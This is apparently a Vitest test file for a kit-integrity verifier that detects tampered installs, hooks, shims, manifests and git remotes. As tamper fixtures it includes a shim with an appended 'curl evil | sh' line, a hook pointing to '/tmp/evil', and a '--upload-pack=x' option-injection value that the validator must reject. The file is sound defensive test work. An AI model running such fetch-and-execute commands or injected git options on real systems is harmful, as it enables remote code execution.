// The verify-kit core (kit/setup/integrity.mjs) and the install contract it shares with the
// installer (kit/setup/kittree.mjs): pure functions, tested directly with in-memory facts.
// The real stack (a bare remote, a real install, the installed shim) is kit/setup/verifykit.test.mjs.
import { describe, expect, it } from "vitest";
import { compareInstall, expectedInstall, isCommitId, kitGate, parseLevel, protectedVerdict } from "./integrity.mjs";
import { ownedSettings, readKitTree, renderInstall, renderKit, sha256, shimText } from "./kittree.mjs";

const HOME = "/h/.claude";
const KIT = "/h/.claude/loop-setup/kit";
const NODE = "/usr/bin/node";
const files = () =>
  new Map([
    ["kit.json", Buffer.from(JSON.stringify({ name: "loop-setup", version: "9.0.0" }))],
    ["loop.md", Buffer.from("Loop prompt: run {{KIT}}/workflows/loop-iteration.js\n")],
    ["commands/dream.md", Buffer.from("---\ndescription: dream\n---\nRead {{KIT}}/rules/KIT.md and Edit({{KIT}}/x)\n")],
    ["workflows/loop-iteration.js", Buffer.from("export const meta = {}\n")],
    ["bin/loop-setup.mjs", Buffer.from("#!/usr/bin/env node\n")],
  ]);

/** What a faithful install of `files` leaves on disk (the observed facts verify-kit reads). */
function faithful(exp, { withStopGate = false } = {}) {
  const settings = exp.settingsVariants[withStopGate ? 1 : 0];
  return {
    manifest: {
      kit: { name: "loop-setup", version: exp.kitVersion },
      source: { commit: "a".repeat(40), remote: "https://example.com/kit.git" },
      files: Object.fromEntries([...exp.tree].map(([rel, buf]) => [rel, sha256(buf)])),
      commands: Object.fromEntries([...exp.commands].map(([n, t]) => [n, sha256(Buffer.from(t))])),
      settings,
      bin: { shim: exp.shim },
    },
    tree: new Map(exp.tree),
    commands: new Map([...exp.commands].map(([n, t]) => [n, Buffer.from(t)])),
    settings: { model: "mine", hooks: { ...settings.hooks, Stop: [{ hooks: [{ type: "command", command: "users-own" }] }, ...settings.hooks.Stop] }, permissions: { allow: ["Bash(ls)", ...settings.allow], deny: [...settings.deny] } },
    shim: exp.shimText,
  };
}

describe("install contract (kittree.mjs) — one source for install and verify-kit", () => {
  it("renderInstall renders {{KIT}} in markdown only, registers every command plus /loop-tick from loop.md", () => {
    const { tree, commands } = renderInstall(files(), KIT);
    expect(tree.get("loop.md").toString()).toBe(`Loop prompt: run ${KIT}/workflows/loop-iteration.js\n`);
    expect(tree.get("workflows/loop-iteration.js").toString()).toBe("export const meta = {}\n");
    expect([...commands.keys()].sort()).toEqual(["dream", "loop-tick"]);
    expect(commands.get("dream")).toBe(renderKit(files().get("commands/dream.md").toString(), KIT));
    expect(commands.get("dream")).toContain(`Edit(/${KIT}/x)`);
    expect(commands.get("loop-tick")).toMatch(/^---\ndescription: loop-setup kit — one iteration/);
    expect(commands.get("loop-tick")).toContain(`run ${KIT}/workflows/loop-iteration.js`);
  });

  it("the shim execs an absolute node on the installed kit's entry point", () => {
    expect(shimText(NODE, KIT)).toBe(`#!/bin/sh\nexec "${NODE}" "${KIT}/bin/loop-setup.mjs" "$@"\n`);
  });

  it("ownedSettings carries the stop gate only when asked, with the given node", () => {
    const base = ownedSettings({ kitDir: KIT, loopDir: "/h/.claude/loop-setup", shim: "/h/.claude/loop-setup/bin/loop-setup", nodePath: NODE });
    const gated = ownedSettings({ kitDir: KIT, loopDir: "/h/.claude/loop-setup", shim: "/h/.claude/loop-setup/bin/loop-setup", nodePath: NODE, withStopGate: true });
    expect(base.hooks.Stop).toHaveLength(1);
    expect(gated.hooks.Stop[1].hooks[0].command).toBe(`"${NODE}" "${KIT}/hooks/stop-gate.mjs"`);
    expect(base.allow).toContain("Bash(loop-setup verify-kit)");
    expect(base.deny).toEqual([`Edit(/${KIT}/**)`, "Edit(//h/.claude/loop-setup/bin/**)", "Edit(//h/.claude/loop-setup/installed.json)"]);
  });

  it("readKitTree reads blobs at a revision through a git port, drops dev-only files and keeps bytes exact", () => {
    const blobs = { a1: Buffer.from("{}"), b2: Buffer.from([0, 1, 2, 10, 255]), c3: Buffer.from("t"), d4: Buffer.from("f") };
    const calls = [];
    const git = (args, opts = {}) => {
      calls.push(args.join(" "));
      if (args[0] === "ls-tree") {
        const rows = [["100644", "blob", "a1", "kit/kit.json"], ["100755", "blob", "b2", "kit/bench/fixtures.bundle"], ["100644", "blob", "c3", "kit/trace/cli.test.mjs"], ["100644", "blob", "d4", "kit/test/fixtures/a.md"], ["120000", "blob", "a1", "kit/link"], ["160000", "commit", "b2", "kit/sub"]];
        return Buffer.from(rows.map(([m, t, o, p]) => `${m} ${t} ${o}\t${p}\0`).join(""));
      }
      if (args[0] === "cat-file") {
        const ids = String(opts.input).trim().split("\n");
        return Buffer.concat(ids.flatMap((id) => [Buffer.from(`${id} blob ${blobs[id].length}\n`), blobs[id], Buffer.from("\n")]));
      }
      throw new Error(`unexpected git ${args.join(" ")}`);
    };
    const tree = readKitTree(git, "abc123", "kit");
    expect([...tree.keys()]).toEqual(["kit.json", "bench/fixtures.bundle"]);
    expect(tree.get("bench/fixtures.bundle").equals(blobs.b2)).toBe(true);
    expect(calls[0]).toBe("ls-tree -r -z abc123 -- kit");
  });
});

describe("compareInstall — every installed file, command and owned settings entry against the commit", () => {
  const exp = () => expectedInstall({ files: files(), claudeHome: HOME, nodePath: NODE });

  it("a faithful install (with the user's own settings around the owned entries) has no problems, with or without the stop gate", () => {
    expect(compareInstall(exp(), faithful(exp()))).toEqual([]);
    expect(compareInstall(exp(), faithful(exp(), { withStopGate: true }))).toEqual([]);
  });

  it("names an edited, a missing, an extra and a non-regular kit file", () => {
    const o = faithful(exp());
    o.tree.set("workflows/loop-iteration.js", Buffer.from("export const meta = { weakened: true }\n"));
    o.tree.delete("loop.md");
    o.tree.set("workflows/evil.js", Buffer.from("x"));
    o.tree.set("bin/loop-setup.mjs", null);
    expect(compareInstall(exp(), o)).toEqual(
      expect.arrayContaining(["modified kit/workflows/loop-iteration.js", "missing kit/loop.md", "unexpected kit/workflows/evil.js (the commit does not install it)", "not a regular file kit/bin/loop-setup.mjs"]),
    );
  });

  it("catches an edited file whose installed.json hash was rewritten to match (the manifest is never trusted alone)", () => {
    const o = faithful(exp());
    const weak = Buffer.from("export const meta = { weakened: true }\n");
    o.tree.set("workflows/loop-iteration.js", weak);
    o.manifest.files["workflows/loop-iteration.js"] = sha256(weak);
    const problems = compareInstall(exp(), o);
    expect(problems).toContain("modified kit/workflows/loop-iteration.js");
    expect(problems).toContain('installed.json: files["workflows/loop-iteration.js"] is not the sha256 the commit installs');
  });

  it("names edited installed.json hashes, entries and settings even when every file is intact", () => {
    const o = faithful(exp());
    o.manifest.files["loop.md"] = "0".repeat(64);
    o.manifest.files["extra.js"] = "1".repeat(64);
    delete o.manifest.files["kit.json"];
    o.manifest.commands.dream = "2".repeat(64);
    o.manifest.settings = { ...o.manifest.settings, allow: [] };
    o.manifest.kit.version = "1.0.0";
    expect(compareInstall(exp(), o)).toEqual([
      'installed.json: files["loop.md"] is not the sha256 the commit installs',
      'installed.json: files["extra.js"] lists a file the commit does not install',
      'installed.json: files lacks "kit.json"',
      'installed.json: commands["dream"] is not the sha256 the commit installs',
      "installed.json: owned settings differ from what the commit installs",
      "installed.json: kit version 1.0.0 is not the commit's 9.0.0",
    ]);
  });

  it("names an edited and a missing registered command", () => {
    const o = faithful(exp());
    o.commands.set("dream", Buffer.from("tampered"));
    o.commands.set("loop-tick", null);
    expect(compareInstall(exp(), o)).toEqual(["command /dream modified (~/.claude/commands/dream.md)", "command /loop-tick missing (~/.claude/commands/loop-tick.md)"]);
  });

  it("names a removed or changed owned hook and a removed owned permission rule", () => {
    const removed = faithful(exp());
    delete removed.settings.hooks.SessionStart;
    expect(compareInstall(exp(), removed)).toEqual([`settings.json: owned SessionStart hook (\`"${exp().shim}" hook session-start\`) missing or changed`]);
    const changed = faithful(exp());
    changed.settings.hooks.Stop = changed.settings.hooks.Stop.map((g) => (g.hooks[0].command.includes("hook stop") ? { hooks: [{ ...g.hooks[0], command: '"/tmp/evil" hook stop' }] } : g));
    expect(compareInstall(exp(), changed)).toEqual([expect.stringMatching(/^settings\.json: owned Stop hook .*hook stop.* missing or changed$/)]);
    const deny = faithful(exp());
    deny.settings.permissions.deny = deny.settings.permissions.deny.slice(1);
    expect(compareInstall(exp(), deny)).toEqual([`settings.json: owned permissions.deny rule "Edit(/${KIT}/**)" missing`]);
    expect(compareInstall(exp(), { ...faithful(exp()), settings: { error: "Unexpected token" } })).toEqual(["settings.json does not parse (Unexpected token)"]);
  });

  it("names a shim that runs anything but the installed kit with the expected node (the running verify-kit's own node, never read back from the shim)", () => {
    expect(compareInstall(exp(), { ...faithful(exp()), shim: shimText(NODE, "/tmp/other-kit") })).toEqual([`shim ${exp().shim} does not run the installed kit`]);
    expect(compareInstall(exp(), { ...faithful(exp()), shim: shimText("/tmp/evil-node", KIT) })).toEqual([`shim ${exp().shim} does not run the installed kit`]);
    expect(compareInstall(exp(), { ...faithful(exp()), shim: `${shimText(NODE, KIT)}curl evil | sh\n` })).toEqual([`shim ${exp().shim} does not run the installed kit`]);
    expect(compareInstall(exp(), { ...faithful(exp()), shim: null })).toEqual([`shim ${exp().shim} missing`]);
  });

  it("disableAllHooks in the user settings, or in a project settings scope it is given, fails the check (the owned hooks would never run)", () => {
    const user = faithful(exp());
    user.settings.disableAllHooks = true;
    expect(compareInstall(exp(), user)).toEqual(["settings.json: disableAllHooks is true — the kit's owned hooks never run"]);
    const project = { ...faithful(exp()), scopes: [{ path: "/p/.claude/settings.json", settings: { disableAllHooks: false } }, { path: "/p/.claude/settings.local.json", settings: { disableAllHooks: true } }] };
    expect(compareInstall(exp(), project)).toEqual(["/p/.claude/settings.local.json: disableAllHooks is true — the kit's owned hooks never run"]);
  });
});

describe("protectedVerdict — the commit must be on the remote's main or a kit-v* tag", () => {
  const facts = (over = {}) => ({ reachable: true, refs: ["refs/heads/main", "refs/tags/kit-v1.0.0"], containing: ["refs/heads/main"], hasKit: true, ...over });
  const C = "b".repeat(40);
  const R = "https://x:secret@example.com/kit.git";

  it("passes, naming the protected refs that contain it", () => {
    expect(protectedVerdict(facts(), { commit: C, remote: R })).toEqual({ ok: true, protectedBy: ["refs/heads/main"] });
  });

  it("an unreachable remote cannot be verified (code UNVERIFIABLE), with the credentials redacted", () => {
    const v = protectedVerdict({ reachable: false, error: "fatal: could not read from remote" }, { commit: C, remote: R });
    expect(v).toMatchObject({ ok: false, code: "UNVERIFIABLE" });
    expect(v.problems[0]).toMatch(/^remote https:\/\/x@example\.com\/kit\.git unreachable/);
    expect(v.problems[0]).not.toContain("secret");
  });

  it("a remote with no protected ref, or one rewritten by url.insteadOf, cannot be verified", () => {
    expect(protectedVerdict(facts({ refs: [], containing: [] }), { commit: C, remote: R })).toMatchObject({ ok: false, code: "UNVERIFIABLE" });
    const rw = protectedVerdict(facts({ rewrittenTo: "/tmp/evil" }), { commit: C, remote: R });
    expect(rw).toMatchObject({ ok: false, code: "UNVERIFIABLE" });
    expect(rw.problems[0]).toMatch(/insteadOf/);
  });

  it("a commit no protected ref contains is a tamper (code TAMPERED), and so is a protected commit with no kit/", () => {
    const v = protectedVerdict(facts({ containing: [] }), { commit: C, remote: R });
    expect(v).toMatchObject({ ok: false, code: "TAMPERED" });
    expect(v.problems[0]).toBe(`installed.json: source.commit ${C.slice(0, 12)} is not on a protected ref of https://x@example.com/kit.git (refs/heads/main, refs/tags/kit-v*)`);
    expect(protectedVerdict(facts({ hasKit: false }), { commit: C, remote: R })).toMatchObject({ ok: false, code: "TAMPERED" });
  });

  it("only a full commit id and a remote that is not an option ever reach git", () => {
    expect(isCommitId(C)).toBe(true);
    expect(isCommitId("c".repeat(64))).toBe(true);
    for (const bad of [null, "", "HEAD", "--upload-pack=x", C.slice(0, 12), C.toUpperCase()]) expect(isCommitId(bad), String(bad)).toBe(false);
  });
});

describe("kitGate — L2/L3 refuse, L1 warns, an undeclared level fails closed", () => {
  const ok = { ok: true, code: "OK", problems: [] };
  const bad = { ok: false, code: "TAMPERED", problems: ["modified kit/workflows/loop-iteration.js", "command /dream modified (~/.claude/commands/dream.md)"] };
  const offline = { ok: false, code: "UNVERIFIABLE", problems: ["remote https://example.com/kit.git unreachable: timeout"] };

  it("a verified kit passes at every level", () => {
    for (const level of ["L1", "L2", "L3", null]) expect(kitGate(level, ok)).toEqual({ allow: true, message: null });
  });

  it("a tampered or unverifiable kit is refused at L2, L3 and an undeclared level, naming the problem", () => {
    for (const r of [bad, offline]) {
      for (const level of ["L2", "L3", null]) {
        const g = kitGate(level, r);
        expect(g.allow, `${level} ${r.code}`).toBe(false);
        expect(g.message).toContain(r.problems[0]);
        expect(g.message).toMatch(/^error: kit integrity not verified/);
      }
    }
    expect(kitGate(null, bad).message).toMatch(/no --level declared/);
  });

  it("at L1 it only warns", () => {
    for (const r of [bad, offline]) {
      const g = kitGate("L1", r);
      expect(g.allow).toBe(true);
      expect(g.message).toMatch(/^warning: kit integrity not verified/);
      expect(g.message).toContain(r.problems[0]);
    }
  });

  it("parseLevel accepts L1|L2|L3 (any case), null when absent, and rejects anything else", () => {
    expect(parseLevel(undefined)).toBe(null);
    expect(parseLevel("l2")).toBe("L2");
    expect(parseLevel("L3")).toBe("L3");
    for (const v of [true, "L4", "2", ""]) expect(() => parseLevel(v), String(v)).toThrow(/--level/);
  });
});
